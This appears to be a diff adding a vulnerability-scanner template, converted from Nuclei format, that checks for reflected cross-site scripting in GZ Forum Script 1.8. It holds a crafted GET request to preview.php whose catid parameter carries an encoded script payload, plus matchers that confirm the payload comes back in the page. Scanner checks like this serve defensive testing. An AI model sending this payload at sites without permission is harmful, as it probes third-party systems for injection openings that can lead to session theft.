@@ -1,0 +1,119 @@
+{
+  "id": "gz-forum-script-xss",
+  "name": "GZ Forum Script 1.8 - Cross-Site Scripting",
+  "author": "r3Y3r53",
+  "severity": "MEDIUM",
+  "description": "Cross-site scripting (XSS) is an attack in which an attacker injects malicious executable scripts into the code of a trusted application or website. Attackers often initiate an XSS attack by sending a malicious link to a user and enticing the user to click it.\n",
+  "references": [
+    "https://www.exploit-db.com/exploits/51559",
+    "https://gzscripts.com/gz-forum-script.html"
+  ],
+  "tags": [
+    "gzforum",
+    "xss",
+    "unauth"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/preview.php?controller\u003dLoad\u0026action\u003dindex\u0026catid\u003dmoztj%22%3E%3Cscript%3Ealert(document.domain)%3C%2fscript%3Ems3ea\u0026down_up\u003da",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "status_code \u003d\u003d 200",
+            "contains(body, \"\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e\") \u0026\u0026 contains(body, \"New Topic\")",
+            "contains(content_type, \"text/html\")"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "gz-forum-script-xss",
+    "info": {
+      "name": "GZ Forum Script 1.8 - Cross-Site Scripting",
+      "author": "r3Y3r53",
+      "severity": "medium",
+      "description": "Cross-site scripting (XSS) is an attack in which an attacker injects malicious executable scripts into the code of a trusted application or website. Attackers often initiate an XSS attack by sending a malicious link to a user and enticing the user to click it.\n",
+      "reference": [
+        "https://www.exploit-db.com/exploits/51559",
+        "https://gzscripts.com/gz-forum-script.html"
+      ],
+      "metadata": {
+        "max_request": 1
+      },
+      "tags": "gzforum,xss,unauth"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/preview.php?controller\u003dLoad\u0026action\u003dindex\u0026catid\u003dmoztj%22%3E%3Cscript%3Ealert(document.domain)%3C%2fscript%3Ems3ea\u0026down_up\u003da"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "status_code \u003d\u003d 200",
+              "contains(body, \"\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e\") \u0026\u0026 contains(body, \"New Topic\")",
+              "contains(content_type, \"text/html\")"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
